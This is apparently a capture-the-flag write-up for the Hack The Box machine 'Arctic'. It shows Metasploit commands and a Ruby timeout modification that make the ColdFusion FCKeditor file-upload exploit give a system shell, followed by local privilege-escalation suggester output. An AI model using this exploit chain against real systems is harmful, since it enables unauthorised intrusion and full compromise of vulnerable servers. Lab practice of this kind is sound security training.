# Arctic
## The Magic of Coldfusion & Modification

Let's get straight into the point. You will use a vulnerable Adobe Coldfusion at port 8500 to gain access to the system.
> This is not as straight forward as it usually is
```
use windows/http/coldfusion_fckeditor
set RHOSTS 10.10.10.11
set RPORT 8500
```
*Boom, You got yourself no shell*
> That is because the server has a security feature of waiting about 25s before responding

> This is how we get around it

Find the metasploit module windows/http/coldfusion_fckeditor, and modify it to wait the 25s instead of 5s.

```ruby
res = send_request_cgi(
  {
    'uri'		=> normalize_uri(datastore['FCKEDITOR_DIR']),
    'query'		=> "Command=FileUpload&Type=File&CurrentFolder=/#{page}%00",
    'version'	=> '1.1',
    'method'	=> 'POST',
    'ctype'		=> 'multipart/form-data; boundary=' + dbl.bound,
    'data'		=> file,
  }, 5)

if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ )
  print_status("Upload succeeded! Executing payload...")

  send_request_raw(
    {
      # default path in Adobe ColdFusion 8.0.1.
      'uri'		=> '/userfiles/file/' + page,
      'method'	=> 'GET',
    }, 5)
```
> This bit of code needs to be changed to this ->

```ruby
res = send_request_cgi(
  {
    'uri'		=> normalize_uri(datastore['FCKEDITOR_DIR']),
    'query'		=> "Command=FileUpload&Type=File&CurrentFolder=/#{page}%00",
    'version'	=> '1.1',
    'method'	=> 'POST',
    'ctype'		=> 'multipart/form-data; boundary=' + dbl.bound,
    'data'		=> file,
  }, 25)

if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ )
  print_status("Upload succeeded! Executing payload...")

  send_request_raw(
    {
      # default path in Adobe ColdFusion 8.0.1.
      'uri'		=> '/userfiles/file/' + page,
      'method'	=> 'GET',
    }, 25)
```

*Now exploit with the module again, and you have got yourself a system shell!*

After gaining a meterpreter shell and running multi/recon/local_exploit_suggester, you will find yourself with many exploits to choose from. Pick almost ANYTHING and WIN!
```
[*] 10.10.10.11 - Collecting local exploits for x86/windows...
[*] 10.10.10.11 - 29 exploit checks are being tried...
[+] 10.10.10.11 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
*:)!*
